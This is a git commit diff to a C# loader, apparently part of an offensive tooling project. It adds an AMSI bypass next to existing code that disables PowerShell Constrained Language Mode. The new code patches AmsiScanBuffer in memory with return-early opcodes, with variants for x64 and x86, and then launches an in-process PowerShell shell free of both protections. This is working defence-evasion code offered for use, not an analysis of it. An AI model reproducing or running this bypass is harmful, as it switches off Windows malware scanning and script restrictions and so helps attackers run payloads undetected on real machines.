56c5f028dc883900281808edc416fa0364ff33d9
Caleb Stewart <caleb.stewart94@gmail.com>
2021-01-31 11:02:09 -0800

    Added AMSI bypass

--- bypass-clm/Program.cs
+++ bypass-clm/Program.cs
@@ -11,6 +11,10 @@ namespace loader
         private static extern IntPtr GetStdHandle(int nStdHandle);
         [DllImport("kernel32")]
         public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+        [DllImport("kernel32")]
+        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+        [DllImport("kernel32")]
+        public static extern IntPtr LoadLibrary(string name);
 
         public static void Main(string[] args)
         {
@@ -38,6 +42,27 @@ namespace loader
             // Write the instructions "mov rax, 0; ret". This returns 0, which is the same as returning SystemEnforcementMode.None
             var new_instr = new byte[] { 0x48, 0x31, 0xc0, 0xc3 };
             Marshal.Copy(new_instr, 0, get_lockdown_ptr, 4);
+
+            // Before we start powershell, we nullify AmsiScanBuffer as well. This ensures AMSI doesn't plague
+            // us in our new shell.
+            var amsi = LoadLibrary("amsi.dll");
+            var AmsiScanBuffer = GetProcAddress(amsi, "AmsiScanBuffer");
+            VirtualProtect(AmsiScanBuffer, new UIntPtr(8), 0x40, out lpflOldProtect);
+
+            // Stolen from https://github.com/rasta-mouse/AmsiScanBufferBypass
+            // On x86, Windows uses __stdcall, which is callee cleanup, whereas 64-bit uses Microsoft x64 calling convention
+            // which is caller cleanup. If we don't use the right one, we will get a stack alignment error.
+            if (System.IntPtr.Size == 8)
+            {
+                // mov eax,E_INVALIDARG
+                // ret
+                Marshal.Copy(new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 }, 0, AmsiScanBuffer, 6);
+            } else
+            {
+                // mov eax,E_INVALIDARG
+                // ret 18
+                Marshal.Copy(new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 }, 0, AmsiScanBuffer, 8);
+            }
 
             // Run powershell from the current process (won't start powershell.exe, but run from the powershell .Net libraries)
             Microsoft.PowerShell.ConsoleShell.Start(System.Management.Automation.Runspaces.RunspaceConfiguration.Create(), "Banner", "Help", new string[] { });
